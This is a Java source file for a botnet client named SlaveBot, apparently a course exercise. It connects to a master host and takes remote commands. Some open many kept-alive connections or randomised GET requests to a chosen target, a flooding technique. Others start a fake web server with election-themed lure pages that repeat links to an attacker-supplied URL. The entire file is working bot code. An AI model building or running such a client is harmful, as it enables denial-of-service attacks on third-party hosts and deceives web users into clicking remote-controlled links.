import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.net.BindException;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.util.HashMap;
import java.util.Map;
import java.util.Map.Entry;
import java.util.Random;

public class SlaveBot extends Thread
{
	int port;
	String url = null;
	ServerSocket Virtual_web_server = null; 
	/*
	 * constructor of the slave
	 */
	SlaveBot(int port_arg, String url_arg) throws IOException
	{
		port = port_arg;
		url = url_arg;
		Virtual_web_server = new ServerSocket(port);
	}
	
	// Defining a hash map to map the server to the port number
	private static Map<Integer, ServerSocket> map_port_server = new HashMap<Integer, ServerSocket>();
	
	// Hash map to make the entry of the socket created for a defined target
	private static Map<Socket, String> map_slavesocket_targetdetails = new HashMap<Socket, String>();
	
	public static void main(String[] args) throws Exception
	{
		int master_port = 0;
		String master_ip_address = null;
		Socket vs = null;
		PrintStream out = null;
		
		//getting the IP address and port number from command line argument 
		if (args[0].equals("h") && args[2].equals("p") && args.length == 4)
		{
			master_port = Integer.parseInt(args[3]);
			master_ip_address = args[1];
		}
		else
		{
			//Invalid argument
			System.exit(-1);
		}
		
		/*
		 * Creating a socket to communicate with the master
		 * master_ip_address - IP Address of the master
		 * master_port - listening port of the master 
		 */
		Socket slave_sc = new Socket(master_ip_address, master_port);
		
		
		while(true)
		{
			//Reading the data from Master Bot
			BufferedReader buff_red = new BufferedReader(new InputStreamReader(slave_sc.getInputStream()));
			String readLine = buff_red.readLine();
			String[] user_options = null;
			
			//Splittig the infomation passed from Master
			try
			{
				user_options = readLine.split("\\s+");
			}
			catch(NullPointerException NPE)
			{
				System.err.println("The Master Bot is terminated or the value passed by the Master is null. So exiting from the slave bot");
				slave_sc.close();
				buff_red.close();
				System.exit(0);
			}
			
			//Operation to be performed
			String operation = user_options[0];
			String extra_option = null;
			
			if (operation.equals("connect"))
			{
				//If the option is connect
				
				int conn = 0;
				
				/*
				 * If the number of arguments that are being passed is 5
				 */
				if (user_options.length == 5)
				{
					if (user_options[4].contains("keepalive") || user_options[4].contains("url="))
					{
						/*
						 * If it contains only the option of keepalive or url= 
						 */
						extra_option = user_options[4];
						conn = 1;
					}
					else
					{
						/*
						 * if the number of connections to be established is given
						 */
						conn = Integer.parseInt(user_options[4]);
					}
					
				}
				else if(user_options.length == 6)
				{
					/*
					 * If number of arguments passed is 6
					 */
					//Taking the number of connection from the array
					conn = Integer.parseInt(user_options[4]);
					extra_option = user_options[5];
				}
				else
				{
					/*
					 * if the number of arguments passed is 4
					 */
					
					if (user_options.length == 4)
					{
						conn = 1;
					}
					else
					{
						System.err.println("Invalid number of inputs provided!!. Please enter the command properly.");
						continue;
					}
				}
				
				/*
				 * Taking Ip address and port number for target host
				 */
				String tar_hostName_ip = user_options[2];
				int tar_port = Integer.parseInt(user_options[3]);
				for (int i = 0; i <conn; i++)
				{
					//Creating a socket to connect Target
					Socket slav_targ_host = new Socket(tar_hostName_ip, tar_port);
					
					//Creating a hashmap between socket and string
					String temp_string = tar_hostName_ip + " " + tar_port;
					map_slavesocket_targetdetails.put(slav_targ_host, temp_string);
					
					//String keepalive_option = "keepalive";
					if (extra_option != null && extra_option.contains("keepalive"))
					{
						//Setting the Socket Alive for a long time
						slav_targ_host.setKeepAlive(true);
					}
					else if(extra_option != null && extra_option.contains("url="))
					{
						/*
						 * Fetching the source file
						 */
						String[] url_arry = extra_option.split("=");
						String source_file = url_arry[1];
						
						/*
						 * Generating the random number
						 */
						StringBuilder sb = new StringBuilder();
						Random ran_obj =  new Random();
						int size = 10;
						String str_val = "abcdefghijklmnop";
						for (int r=1; r<=size; r++)
						{
							sb.append(str_val.charAt(ran_obj.nextInt(str_val.length())));
						}
						
						String info_to_send = "GET "+tar_hostName_ip+source_file+sb;
						
						/*
						 * Passing the string to the target server
						 */
						PrintWriter wrt = new PrintWriter(slav_targ_host.getOutputStream());
						wrt.println(info_to_send);
						wrt.flush();
						
						BufferedReader buffRead= new BufferedReader(new InputStreamReader(slav_targ_host.getInputStream()));
						String readline = buffRead.readLine();
						System.out.println(readline);
						//Deleting the vaules present in the buffer
						readline = null;
							
					}
					
				 }
				
			}//if (operation.equals("disconnect"))
			else if(operation.equals("disconnect"))
			{
				//If the length of the stringd is other than 4 and 3 exist from the program
				if ((user_options.length != 4) && (user_options.length != 3))
				{
					System.exit(-1);
				}
				
				if (user_options.length == 4)
				{
					//If the length is 4 means, the port number is defined
					for(Entry<Socket, String> entry: map_slavesocket_targetdetails.entrySet())
					{
						String temp = entry.getValue();
						String[] targer_strings = temp.split("\\s+");
						if (user_options[2].equals(targer_strings[0]) && user_options[3].equals(targer_strings[1]))
						{
							//If the both hostname and the port matches, then close the socket
							Socket slave_tar = entry.getKey();
							slave_tar.close();
							//map_slavesocket_targetdetails.remove(slave_tar,temp);	
						}
						
					}
				}
				else
				{
					for(Entry<Socket, String> entry: map_slavesocket_targetdetails.entrySet())
					{
						Socket slave_tar = entry.getKey();
						String temp = entry.getValue();
						String[] targer_strings = temp.split("\\s+");
						if (user_options[2].equals(targer_strings[0]))
						{
							//Close all the port which matches with the local host name of the target
							slave_tar.close();
							//map_slavesocket_targetdetails.remove(slave_tar,temp);
						}
						
					}
				}
				
			}// End of elseif(operation.equals("disconnect"))
			else if(operation.equals("rise-fake-url"))
			{
				// for the rise-fake-url command
				if(user_options.length == 3)
				{
					//Getting the port at which the web page is to be hosted from the command line argument
					int web_serv_port = Integer.parseInt(user_options[1]);
					
					// Getting the fake url
					String url_serv = user_options[2];
					
					// If the url does not contain https:// add the string
					if (!url_serv.contains("http"))
					{
						url_serv = "http://" + url_serv;
					}
					
					// Create an instance of slave bot
					SlaveBot sl = null;
					try
					{
						sl = new SlaveBot(web_serv_port, url_serv);
					}
					catch(BindException BE)
					{
						System.err.println("A process or a server for other slave bot created in this machine is already using that port.");
						System.err.println("You can create only one server per slave bot in a machine for a given port number");
						continue;
					}
					map_port_server.put(sl.port ,sl.Virtual_web_server);
					
					//Start thr thread
					sl.start();
						
				}
				else
				{
					System.err.println("Invalid number of inputs provided!!. Please enter the command properly.");
					continue;
				}
			}// end of else if(operation.equals("rise-fake-url"))
			else if(operation.equals("down-fake-url"))
			{
				// for down-fake-url command
				ServerSocket serv_sock = null;
				if(user_options.length == 3)
				{
					// closing the socket which matches with the port number
					for(Entry<Integer, ServerSocket> entry: map_port_server.entrySet())
					{
						int web_serv_port = Integer.parseInt(user_options[1]);
						int serv_port = entry.getKey();
						
						if (web_serv_port==serv_port)
						{
							serv_sock = entry.getValue();
							serv_sock.close();
						}
					} 
					
				}
				else
				{
					System.err.println("Invalid number of inputs provided!!. Please enter the command properly.");
					continue;
				}
			}// end of else if(operation.equals("down-fake-url"))
			else
			{
				System.exit(-1);
			}
			
			
		}//End of while
		
		
	}//End of main
	
	
	//Implementing run function
	public void run()
	{
		try {
			Socket vs = null;
			PrintStream out = null;
			BufferedReader buff_html = null;
			
			//Listen for the request
			vs = Virtual_web_server.accept();
			
			/*
			 * Hosting the HtML page
			 */
			out = new PrintStream(vs.getOutputStream(), true);
			out.println("HTTP/1.1 200 OK");
			out.println("Content-Type: text/html");
			out.println("\r\n");
			out.println("<p>To select the suitable president for your great country, the folowing links may be helpful for you</p>");
			out.println("<p>To know about the personal life of your president candidate:<a href=\"index1.html\">click here!</a></p>");
			out.println("<p>To know about the achivements of your president candidate: <a href=\"index2.html\">click here!</a></p>");
			out.println("<p>150eda50a6d011c51e21057fedea8996</p>");
			out.flush(); 

			buff_html = new BufferedReader(new InputStreamReader(vs.getInputStream()));
			String response = buff_html.readLine();
			
			if (response.contains("GET / HTTP/1.1"))
			{
				// The response for the page is host is obtained
			}
			
			/*
			 * Closing the socket and its related components created for the client
			 */
			vs.close();
			out.close();
			buff_html.close();
			
			
			while(true)
			{
				/*
				 * Again listening at the server for any request from he client side
				 * ie if the options provided in the html page is clicked
				 */
				try
				{
					vs = Virtual_web_server.accept();
				}
				catch(SocketException se)
				{	
					// The server might be command by the master to get down. sp just dont throw the exception. 
					// just return from the user
					return;
				}
					
				/*
				 * Getting the object of the BufferedReader class to read the html response. 
				 */
				buff_html = new BufferedReader(new InputStreamReader(vs.getInputStream()));
				response = buff_html.readLine();
				/*
				 * Getting the object of the PrintStream class to print the html again
				 */
				out = new PrintStream(vs.getOutputStream(), true);
				
				/*
				 * If the link is clikced
				 */
				if (response != null)
				{
					//If the request from the client includes GET / HTTP/1.1, then we have to display the
					//main html page again
					if (response.contains("GET / HTTP/1.1"))
					{
						out.println("HTTP/1.1 200 OK");
						out.println("Content-Type: text/html");
						out.println("\r\n");
						out.println("<p>To select the suitable president for your great country, the folowing links may be helpful for you</p>");
						out.println("<p>To know about the personal life of your president candidate:<a href=\"index1.html\">click here!</a></p>");
						out.println("<p>To know about the achivements of your president candidate: <a href=\"index2.html\">click here!</a></p>");
						out.println("<p>150eda50a6d011c51e21057fedea8996</p>");
						out.flush();
					}
					else if(response.contains("index1.html") || response.contains("index2.html"))
					{
						// If the user requests for the index1 or index2 html page
						out.println("HTTP/1.1 200 OK");
						out.println("Content-Type: text/html");
						out.println("\r\n");
						out.println("<p>Below is the important link which gives the full details of your president!!!</p>");
						out.println("<p>150eda50a6d011c51e21057fedea8996</p>");
						out.println("<a href=\""+url+"\">Check this out!</a>");
						out.println("<a href=\""+url+"\">Check this out!</a>");
						out.println("<a href=\""+url+"\">Check this out!</a>");
						out.println("<a href=\""+url+"\">Check this out!</a>");
						out.println("<a href=\""+url+"\">Check this out!</a>");
						out.println("<a href=\""+url+"\">Check this out!</a>");
						out.println("<a href=\""+url+"\">Check this out!</a>");
						out.println("<a href=\""+url+"\">Check this out!</a>");
						out.println("<a href=\""+url+"\">Check this out!</a>");
						out.println("<a href=\""+url+"\">Check this out!</a>");
						out.flush(); 
					}
					else
					{
						// if the response contains the favicon.ico string, just ignore it and continue the loop
						if (response.contains("/favicon.ico"))
						{
							continue;
						}
						
						// If some other request is made by the user
						out.println("HTTP/1.1 200 OK");
						out.println("Content-Type: text/html");
						out.println("\r\n");
						out.println("<p>Sorry that page is not available!!!!</p>");
						out.flush(); 
					}
					
					vs.close();
					out.close();
					buff_html.close();
				}
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}	
	}// end of run() function
	
}//End of class

